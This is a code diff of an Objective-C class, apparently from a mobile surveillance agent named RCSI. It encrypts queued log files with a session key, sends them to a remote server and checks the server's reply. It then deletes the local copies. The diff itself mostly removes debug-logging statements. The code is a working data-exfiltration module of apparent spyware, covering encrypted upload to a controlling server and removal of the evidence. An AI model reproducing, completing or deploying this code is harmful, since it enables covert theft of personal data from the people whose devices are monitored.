@@ -19,9 +19,7 @@
 #import "NSData+SHA1.h"
 
 #import "RCSICommon.h"
-//#import "RCSMLogger.h"
-//#import "RCSMDebug.h"
-
+//#define DEBUG_LOG_NOP
 
 @interface LogNetworkOperation (private)
 
@@ -33,25 +31,15 @@
 
 - (BOOL)_sendLogContent: (NSData *)aLogData
 {
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"");
-#endif
-  
   if (aLogData == nil)
-    {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"aLogData is nil");
-#endif
-      
+    {   
       return NO;
     }
   
   uint32_t command              = PROTO_LOG;
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   
-  //
   // message = PROTO_LOG | log_size | log_content | sha
-  //
   NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                 length: sizeof(uint32_t)];
   uint32_t dataSize             = [aLogData length];
@@ -63,15 +51,10 @@
   
   [commandData appendData: commandSha];
   
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
-  
+  // XXX-
   [commandData encryptWithKey: gSessionKey];
   
-  //
   // Send encrypted message
-  //
   NSURLResponse *urlResponse    = nil;
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
@@ -79,23 +62,15 @@
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
   
-  if (replyData == nil)
+  if (replyData == nil/* or == null*/)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"empty reply from server");
-#endif
       [commandData release];
       [outerPool release];
-    
       return NO;
     }
   
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
   [replyDecrypted decryptWithKey: gSessionKey];
-  
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
   
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
@@ -103,9 +78,7 @@
   // remove padding
   [replyDecrypted removePadding];
   
-  //
   // check integrity
-  //
   NSData *shaRemote;
   NSData *shaLocal;
   
@@ -118,48 +91,28 @@
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+    {     
       [replyDecrypted release];
       [commandData release];
-      [outerPool release];
-      
+      [outerPool release];      
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
-  
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
-  
+   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
       [replyDecrypted release];
       [commandData release];
-      [outerPool release];
-      
+      [outerPool release];      
       return NO;
     }
    
   if (command != PROTO_OK)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"Server issued a PROTO_%d", command);
-#endif
-      
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -180,10 +133,6 @@
   if (self = [super init])
     {
       mTransport = aTransport;
-      
-#ifdef DEBUG_LOG_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
       return self;
     }
   
@@ -196,30 +145,18 @@
 }
 
 - (BOOL)perform
-{
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"");
-#endif
-  
+{ 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   id anObject;
   
   RCSILogManager *logManager = [RCSILogManager sharedInstance];
 
-  //
   // Logs to the send queue
-  //
   if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
     {
 #ifdef DEBUG_LOG_NOP
-      infoLog(@"Active logs closed correctly");
-#endif
-    }
-  else
-    {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"An error occurred while closing active logs (non-fatal)");
+      NSLog(@"%s: Active logs closed correctly", __FUNCTION__);
 #endif
     }
 
@@ -242,15 +179,16 @@
       if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
         {
           NSData *logContent  = [NSData dataWithContentsOfFile: logName];
-
+          
           if ([self _sendLogContent: logContent] == YES)
             {
               [sendedItem addIndex:i];
+
               if ([[NSFileManager defaultManager] removeItemAtPath: logName
                                                          error: nil] == NO)
                 {
 #ifdef DEBUG_LOG_NOP
-                errorLog(@"Error while removing (%@) from fs", logName);
+                  NSLog(@"%s: Error while removing (%@)", __FUNCTION__, logName);
 #endif
                 }
             }
